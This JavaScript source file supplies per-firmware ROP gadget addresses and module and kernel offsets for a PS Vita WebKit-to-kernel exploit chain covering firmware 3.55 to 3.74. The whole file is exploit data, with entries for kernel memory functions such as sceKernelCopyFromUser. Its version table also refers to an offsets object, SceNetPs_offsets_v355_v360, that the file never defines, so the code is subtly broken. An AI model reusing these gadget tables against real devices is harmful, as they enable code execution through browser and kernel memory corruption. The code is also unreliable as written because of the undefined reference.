/* offsets.js -- offsets for exploitation
 *
 * Copyright (C) 2020 TheFloW, 2022 skgleba
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

// 3.30, 3.35, and 3.36 all use different webkit modules...

SceWebKit_gadgets_v350_v360 = {
  ldm_r0_r0_r1_r4_r8_fp_ip_pc: 0x5490e0,
  ldm_r1_r0_ip_lr_pc: 0x2b11c,
  ldm_r1_r0_r2_r3_r8_fp_ip_pc: 0x62b700,
  ldm_r4_r3_r8_ip_pc: 0xb2bd0,
  ldm_r8_r1_r6_ip_lr_pc: 0x5579e0,
  str_r0_r3_bx_lr: 0x431cd,
}

SceWebKit_gadgets_v361_v365 = {
  ldm_r0_r0_r1_r4_r8_fp_ip_pc: 0x5490e4,
  ldm_r1_r0_ip_lr_pc: 0x2b120,
  ldm_r1_r0_r2_r3_r8_fp_ip_pc: 0x62b6e0,
  ldm_r4_r3_r8_ip_pc: 0xb2bd4,
  ldm_r8_r1_r6_ip_lr_pc: 0x5579c0,
  str_r0_r3_bx_lr: 0x2431d1,
}

SceWebKit_gadgets_v367 = {
  ldm_r0_r0_r1_r4_r8_fp_ip_pc: 0x5490fc,
  ldm_r1_r0_ip_lr_pc: 0x2b120,
  ldm_r1_r0_r2_r3_r8_fp_ip_pc: 0x62b6f8,
  ldm_r4_r3_r8_ip_pc: 0xb2bd4,
  ldm_r8_r1_r6_ip_lr_pc: 0x5579d8,
  str_r0_r3_bx_lr: 0x2431ed,
}

SceWebKit_gadgets_v368_v374 = {
  ldm_r0_r0_r1_r4_r8_fp_ip_pc: 0x549a80,
  ldm_r1_r0_ip_lr_pc: 0x2b19c,
  ldm_r1_r0_r2_r3_r8_fp_ip_pc: 0x62f808,
  ldm_r4_r3_r8_ip_pc: 0xb2d3c,
  ldm_r8_r1_r6_ip_lr_pc: 0x5587b0,
  str_r0_r3_bx_lr: 0x24367d,
}

SceWebKit_offsets_v350_v360 = {
  SceWebKit_base_off: 0xabb65c,
  SceNet_stub_off: 0x85f414,
  SceLibc_stub_off: 0x85f504,
  ScePsp2Compat_stub_off: 0x85d2e4,
  setscrollleft_off: 0x4e,
}

SceWebKit_offsets_v361_v365 = {
  SceWebKit_base_off: 0xabb63c,
  SceNet_stub_off: 0x85f3f4, // thunk to SceNet_07845128 (sceNetNtohs)
  SceLibc_stub_off: 0x85f4e4, // thunk to SceLibc_006B54BA (realloc)
  ScePsp2Compat_stub_off: 0x85d2c4, // thunk to ScePsp2Compat_001E09AF
  setscrollleft_off: 0x4e,
}

SceWebKit_offsets_v367 = {
  SceWebKit_base_off: 0xabb654,
  SceNet_stub_off: 0x85f40c,
  SceLibc_stub_off: 0x85f4fc,
  ScePsp2Compat_stub_off: 0x85d2dc,
  setscrollleft_off: 0x4e,
}

SceWebKit_offsets_v368_v374 = {
  SceWebKit_base_off: 0xac3544,
  SceNet_stub_off: 0x866ab8,
  SceLibc_stub_off: 0x866ba8,
  ScePsp2Compat_stub_off: 0x864988,
  setscrollleft_off: 0x4e,
}

SceLibc_functions_v355_v374 = {
  malloc: 0xfa19,
  free: 0xfa29,
}

SceLibc_gadgets_v355_v374 = {
  setjmp: 0x14071,
  longjmp: 0x14099,
}

SceLibc_offsets_v355_v374 = {
  SceLibc_base_off: 0xfa49,
}

SceNet_functions_v350_v374 = {
  sceNetHtons: 0x23d5,
  sceNetSyscallClose: 0x9f60,
  sceNetSyscallBind: 0x9f80,
  sceNetSyscallIoctl: 0x9f90,
  sceNetSyscallSocket: 0xa030,
  sceNetSyscallGetIfList: 0xa050,
  sceNetSyscallSendmsg: 0xa0b0,
  sceNetSyscallControl: 0xa110,
}

SceNet_offsets_v350_v374 = {
  SceNet_base_off: 0x23ed,
}

ScePsp2Compat_functions_v350_v357 = {
  sceAppMgrIsDevelopmentMode: 0x2c60cc,
}

ScePsp2Compat_functions_v360_v365 = {
  sceAppMgrIsDevelopmentMode: 0x2c60ec,
}

ScePsp2Compat_functions_v367 = {
  sceAppMgrIsDevelopmentMode: 0x2c92c4,
}

ScePsp2Compat_functions_v368_v373 = {
  sceAppMgrIsDevelopmentMode: 0x2c92d4,
}

ScePsp2Compat_functions_v374 = {
  sceAppMgrIsDevelopmentMode: 0x2c96e4,
}

ScePsp2Compat_offsets_v350_v357 = {
  ScePsp2Compat_base_off: 0x22d45,
}

ScePsp2Compat_offsets_v360_v373 = {
  ScePsp2Compat_base_off: 0x22d65, // points to ScePsp2Compat_001E09AF
}

ScePsp2Compat_offsets_v374 = {
  ScePsp2Compat_base_off: 0x23171,
}

SceNetPs_gadgets_v355_v360 = {
  blx_r0_pop_r3_pc: 0x29dc7,
  blx_r3_pop_r3_pc: 0x17f1,
  blx_r4_add_sp_c_pop_r4_r5_pc: 0xdfed,

  pop_pc: 0x15e2f,
  pop_r0_r1_r2_r3_r4_r6_pc: 0x22d5d,
  ldm_r0_r0_r1_r2_r3_r4_ip_sp_lr_pc: 0, // missing, closest is '1a f0 90 e8', 'ldm r0, {r1, r3, r4, ip, sp, lr, pc}'
  ldr_r0_r4_pop_r4_pc: 0x2a43d,

  str_r0_r4_pop_r4_pc: 0x165cf,

  push_r3_r4_lr_pop_r0_r1_r2_r6_r0_r1_r3_r4_r5_r6_pc: 0x2ad17,
  add_r2_r4_pop_r4_r5_str_r2_r1_bx_lr: 0x248ab,
  orrs_r0_r3_pop_r3_pc: 0x3ac7,
  movs_r0_0_pop_r3_pc: 0xb7d,

  sceKernelFreeMemBlock: 0x2a448,
  sceKernelGetMemBlockBase: 0x2a488,
  sceKernelCopyFromUser: 0x2a498,
  sceKernelAllocMemBlockForKernel: 0x2a4b8,

  empty_string: 0x22,
}

SceNetPs_gadgets_v361 = {
  blx_r0_pop_r3_pc: 0x29d37,
  blx_r3_pop_r3_pc: 0x17f1,
  blx_r4_add_sp_c_pop_r4_r5_pc: 0xdf5d,

  pop_pc: 0x15d9f,
  pop_r0_r1_r2_r3_r4_r6_pc: 0x22ccd,
  ldm_r0_r0_r1_r2_r3_r4_ip_sp_lr_pc: 0, // missing, closest is '1a f0 90 e8', 'ldm r0, {r1, r3, r4, ip, sp, lr, pc}'
  ldr_r0_r4_pop_r4_pc: 0x2a3ad,

  str_r0_r4_pop_r4_pc: 0x1653e,

  push_r3_r4_lr_pop_r0_r1_r2_r6_r0_r1_r3_r4_r5_r6_pc: 0x2ac87,
  add_r2_r4_pop_r4_r5_str_r2_r1_bx_lr: 0x2481b,
  orrs_r0_r3_pop_r3_pc: 0x3ac7,
  movs_r0_0_pop_r3_pc: 0xb7d,

  sceKernelFreeMemBlock: 0x2a3b8,
  sceKernelGetMemBlockBase: 0x2a3f8,
  sceKernelCopyFromUser: 0x2a408,
  sceKernelAllocMemBlockForKernel: 0x2a428,

  empty_string: 0x22,
}

SceNetPs_gadgets_v363_v370 = {
  blx_r0_pop_r3_pc: 0x2a11b,
  blx_r3_pop_r3_pc: 0x1959,
  blx_r4_add_sp_c_pop_r4_r5_pc: 0xe361,

  pop_pc: 0x1619f,
  pop_r0_r1_r2_r3_r4_r6_pc: 0x230cd,
  ldm_r0_r0_r1_r2_r3_r4_ip_sp_lr_pc: 0xb734,
  ldr_r0_r4_pop_r4_pc: 0x2a79d,

  str_r0_r4_pop_r4_pc: 0x1693f,

  push_r3_r4_lr_pop_r0_r1_r2_r6_r0_r1_r3_r4_r5_r6_pc: 0x2b067,
  add_r2_r4_pop_r4_r5_str_r2_r1_bx_lr: 0x24c1b,
  orrs_r0_r3_pop_r3_pc: 0x3c2f,
  movs_r0_0_pop_r3_pc: 0xce5,

  sceKernelFreeMemBlock: 0x2a7a8,
  sceKernelGetMemBlockBase: 0x2a7e8,
  sceKernelCopyFromUser: 0x2a7f8,
  sceKernelAllocMemBlockForKernel: 0x2a818,

  empty_string: 0x22,
}

SceNetPs_gadgets_v371_v374 = {
  blx_r0_pop_r3_pc: 0x2a14b,
  blx_r3_pop_r3_pc: 0x1959,
  blx_r4_add_sp_c_pop_r4_r5_pc: 0xe391,

  pop_pc: 0x161cf,
  pop_r0_r1_r2_r3_r4_r6_pc: 0x230fd,
  ldm_r0_r0_r1_r2_r3_r4_ip_sp_lr_pc: 0xb764,
  ldr_r0_r4_pop_r4_pc: 0x2a7cd,

  str_r0_r4_pop_r4_pc: 0x1696f,

  push_r3_r4_lr_pop_r0_r1_r2_r6_r0_r1_r3_r4_r5_r6_pc: 0x2b097,
  add_r2_r4_pop_r4_r5_str_r2_r1_bx_lr: 0x24c4b,
  orrs_r0_r3_pop_r3_pc: 0x3c2f,
  movs_r0_0_pop_r3_pc: 0xce5,

  sceKernelFreeMemBlock: 0x2a7d8,
  sceKernelGetMemBlockBase: 0x2a818,
  sceKernelCopyFromUser: 0x2a828,
  sceKernelAllocMemBlockForKernel: 0x2a848,

  empty_string: 0x22,
}

SceNetPs_offsets_v355_v361 = {
  SceNetPs_base_off: -0x89d1,
}

SceNetPs_offsets_v363_v370 = {
  SceNetPs_base_off: -0x8d45,
}

SceNetPs_offsets_v371_v374 = {
  SceNetPs_base_off: -0x8d75,
}

SceNetPs_dev_gadgets_v363_v370 = {
  blx_r0_pop_r3_pc: 0x2a1ab,
  blx_r3_pop_r3_pc: 0x1959,
  blx_r4_add_sp_c_pop_r4_r5_pc: 0xe3f1,

  pop_pc: 0x1622f,
  pop_r0_r1_r2_r3_r4_r6_pc: 0x2315d,
  ldm_r0_r0_r1_r2_r3_r4_ip_sp_lr_pc: 0xb7c4,
  ldr_r0_r4_pop_r4_pc: 0x2a82d,

  str_r0_r4_pop_r4_pc: 0x169cf,

  push_r3_r4_lr_pop_r0_r1_r2_r6_r0_r1_r3_r4_r5_r6_pc: 0x2b0f7,
  add_r2_r4_pop_r4_r5_str_r2_r1_bx_lr: 0x24cab,
  orrs_r0_r3_pop_r3_pc: 0x3c2f,
  movs_r0_0_pop_r3_pc: 0xce5,

  sceKernelFreeMemBlock: 0x2a838,
  sceKernelGetMemBlockBase: 0x2a878,
  sceKernelCopyFromUser: 0x2a888,
  sceKernelAllocMemBlockForKernel: 0x2a8a8,

  empty_string: 0x22,
}

SceNetPs_dev_gadgets_v371_v374 = {
  blx_r0_pop_r3_pc: 0x2a1db,
  blx_r3_pop_r3_pc: 0x1959,
  blx_r4_add_sp_c_pop_r4_r5_pc: 0xe421,

  pop_pc: 0x1625f,
  pop_r0_r1_r2_r3_r4_r6_pc: 0x2318d,
  ldm_r0_r0_r1_r2_r3_r4_ip_sp_lr_pc: 0xb7f4,
  ldr_r0_r4_pop_r4_pc: 0x2a85d,

  str_r0_r4_pop_r4_pc: 0x169ff,

  push_r3_r4_lr_pop_r0_r1_r2_r6_r0_r1_r3_r4_r5_r6_pc: 0x2B127,
  add_r2_r4_pop_r4_r5_str_r2_r1_bx_lr: 0x24cdb,
  orrs_r0_r3_pop_r3_pc: 0x3c2f,
  movs_r0_0_pop_r3_pc: 0xce5,

  sceKernelFreeMemBlock: 0x2a868,
  sceKernelGetMemBlockBase: 0x2a8a8,
  sceKernelCopyFromUser: 0x2a8b8,
  sceKernelAllocMemBlockForKernel: 0x2a8d8,

  empty_string: 0x22,
}

SceSysmem_offsets_v355_v361 = {
  SceSysmem_base_off: -0xa8ef,
  sceKernelRemapMemBlock: 0xa74d,
  sceKernelDcacheCleanRangeForL1WBWA: 0x22fcd,
}

SceSysmem_offsets_v363_v374 = {
  SceSysmem_base_off: -0x810b,
  sceKernelRemapMemBlock: 0x7f69,
  sceKernelDcacheCleanRangeForL1WBWA: 0x22fcd,
}

supported_versions = {
  // TODO: more? would be nice to go down to 3.30 or something...
  // (this WebKit version was added with 3.30, unsure if the exploit works on older versions.)
  // missing versions in order: 3.30, 3.35, 3.36, 3.50, 3.51, 3.52, 3.55, 3.57
  // WebKit vulnerability confirmed working on 3.36
  //
  "3.55" : 0x03550011,
  "3.57" : 0x03570011,
  "3.60" : 0x03600011,
  "3.61" : 0x03610011,
  "3.63" : 0x03630011,
  "3.65" : 0x03650011,
  "3.67" : 0x03670011,
  "3.68" : 0x03680011,
  "3.69" : 0x03690011,
  "3.70" : 0x03700011,
  "3.71" : 0x03710011,
  "3.72" : 0x03720011,
  "3.73" : 0x03730011,
  "3.74" : 0x03740011,
}

version_deps = {
  0x03550011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v350_v360,
      offsets: SceWebKit_offsets_v350_v360,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v355_v360,
      offsets: SceNetPs_offsets_v355_v360,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v350_v357,
      offsets: ScePsp2Compat_offsets_v350_v357
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v355_v361,
    },
  },
  0x03570011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v350_v360,
      offsets: SceWebKit_offsets_v350_v360,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v355_v360,
      offsets: SceNetPs_offsets_v355_v360,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v350_v357,
      offsets: ScePsp2Compat_offsets_v350_v357
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v355_v361,
    },
  },
  0x03600011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v350_v360,
      offsets: SceWebKit_offsets_v350_v360,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v355_v360,
      offsets: SceNetPs_offsets_v355_v360,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v350_v357,
      offsets: ScePsp2Compat_offsets_v350_v357
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v355_v361,
    },
  },
  0x03610011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v361_v365,
      offsets: SceWebKit_offsets_v361_v365,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v361,
      offsets: SceNetPs_offsets_v355_v361,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v350_v357,
      offsets: ScePsp2Compat_offsets_v350_v357
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v355_v361,
    },
  },
  0x03630011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v361_v365,
      offsets: SceWebKit_offsets_v361_v365,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v363_v370,
      offsets: SceNetPs_offsets_v363_v370,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v360_v365,
      offsets: ScePsp2Compat_offsets_v360_v373
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v363_v374,
    },
  },
  0x03650011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v361_v365,
      offsets: SceWebKit_offsets_v361_v365,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v363_v370,
      offsets: SceNetPs_offsets_v363_v370,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v360_v365,
      offsets: ScePsp2Compat_offsets_v360_v373
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v363_v374,
    },
  },
  0x03670011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v367,
      offsets: SceWebKit_offsets_v367,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v363_v370,
      offsets: SceNetPs_offsets_v363_v370,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v367,
      offsets: ScePsp2Compat_offsets_v360_v373
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v363_v374,
    },
  },
  0x03680011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v368_v374,
      offsets: SceWebKit_offsets_v368_v374,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v363_v370,
      offsets: SceNetPs_offsets_v363_v370,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v368_v374,
      offsets: ScePsp2Compat_offsets_v360_v373
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v363_v374,
    },
  },
  0x03690011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v368_v374,
      offsets: SceWebKit_offsets_v368_v374,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v363_v370,
      offsets: SceNetPs_offsets_v363_v370,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v368_v374,
      offsets: ScePsp2Compat_offsets_v360_v373
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v363_v374,
    },
  },
  0x03700011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v368_v374,
      offsets: SceWebKit_offsets_v368_v374,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v363_v370,
      offsets: SceNetPs_offsets_v363_v370,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v368_v374,
      offsets: ScePsp2Compat_offsets_v360_v373
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v363_v374,
    },
  },
  0x03710011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v368_v374,
      offsets: SceWebKit_offsets_v368_v374,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v371_v374,
      offsets: SceNetPs_offsets_v371_v374,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v368_v374,
      offsets: ScePsp2Compat_offsets_v360_v373
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v363_v374,
    },
  },
  0x03720011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v368_v374,
      offsets: SceWebKit_offsets_v368_v374,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v371_v374,
      offsets: SceNetPs_offsets_v371_v374,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v368_v374,
      offsets: ScePsp2Compat_offsets_v360_v373
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v363_v374,
    },
  },
  0x03730011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v368_v374,
      offsets: SceWebKit_offsets_v368_v374,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v371_v374,
      offsets: SceNetPs_offsets_v371_v374,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v368_v374,
      offsets: ScePsp2Compat_offsets_v360_v373
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v363_v374,
    },
  },
  0x03740011: {
    "SceWebKit": {
      gadgets: SceWebKit_gadgets_v368_v374,
      offsets: SceWebKit_offsets_v368_v374,
    },
    "SceLibc": {
      functions: SceLibc_functions_v355_v374,
      gadgets: SceLibc_gadgets_v355_v374,
      offsets: SceLibc_offsets_v355_v374,
    },
    "SceNet": {
      functions: SceNet_functions_v350_v374,
      offsets: SceNet_offsets_v350_v374,
    },
    "SceNetPs": {
      gadgets: SceNetPs_gadgets_v371_v374,
      offsets: SceNetPs_offsets_v371_v374,
    },
    "ScePsp2Compat": {
      functions: ScePsp2Compat_functions_v374,
      offsets: ScePsp2Compat_offsets_v374
    },
    "SceSysmem": {
      offsets: SceSysmem_offsets_v363_v374,
    },
  },
};
